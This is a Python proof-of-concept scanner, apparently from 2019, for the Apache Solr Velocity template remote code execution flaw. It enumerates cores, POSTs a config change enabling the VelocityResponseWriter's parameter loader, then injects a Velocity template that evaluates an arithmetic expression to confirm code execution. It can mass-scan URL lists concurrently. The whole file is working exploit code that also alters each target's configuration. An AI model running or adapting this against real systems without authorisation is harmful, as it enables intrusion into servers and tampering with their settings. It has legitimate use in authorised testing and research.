#!/usr/bin/env python3
# coding=utf-8
# author: Loneyer
# date: 2019-11-14

from gevent import monkey;monkey.patch_all()
from gevent.pool import Pool
import gevent
import sys
import requests
import re
import json
import argparse
import random

def solr_rce_test(url):

    data = {
        "update-queryresponsewriter": {
            "startup": "test",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
    }
    data_json = json.dumps(data)
    url = url.rstrip('/')
    url1 = url + "/solr/admin/cores?wt=json"
    try:
        t1 = random.randint(10000, 90000)
        t2 = random.randint(10000, 90000)
        response = requests.get(url1)
        r1 = response.text
        solr = str(re.findall(r'"name":"(.*?)"', r1)[0])
        url2 = url + "/solr/{0}/config".format(solr)
        requests.post(url2, data=data_json, headers={'Content-Type': 'application/json'})
        url3 = url + "/solr/{}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{}%20*%20{})%24c".format(
            solr,t1,t2)
        response3 = requests.get(url3)
        if str(t1*t2) in response3.text:
            print("url:{} find vul".format(url))
        else:
            print("url:{} not vul".format(url))
    except KeyboardInterrupt:
        print('bye')
    except:
        # pass
        print("url:{} is error".format(url))

def pocexec(url):
    solr_rce_test(url)
    gevent.sleep(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', dest="url_file", help="url.txt")
    parser.add_argument('-url',dest="url",help="http://www.baidu.com")
    parser.add_argument('-t',dest='threads',type=int,help="threads")
    args = parser.parse_args()
    url = args.url
    t = args.threads
    urlfile = args.url_file
    if urlfile  == None and url ==None:
        print("""
url or urlfile is none

ie:python3 solr_rce.py -f url.txt
   pyrhon3 solr_rce.py -url http://www.google.com
        """)
        sys.exit(1)
    if urlfile!=None and t!=None:
        urllist = []
        with open(str(urlfile)) as f:
            while True:
                line = str(f.readline()).strip()
                if line:
                    urllist.append(line)
                else:
                    break
        try:
            pool = Pool(t)
            threads = [pool.spawn(pocexec, url) for url in urllist]
            gevent.joinall(threads)
        except KeyboardInterrupt:
            print('bye :)')

    elif url!=None:
        solr_rce_test(url)
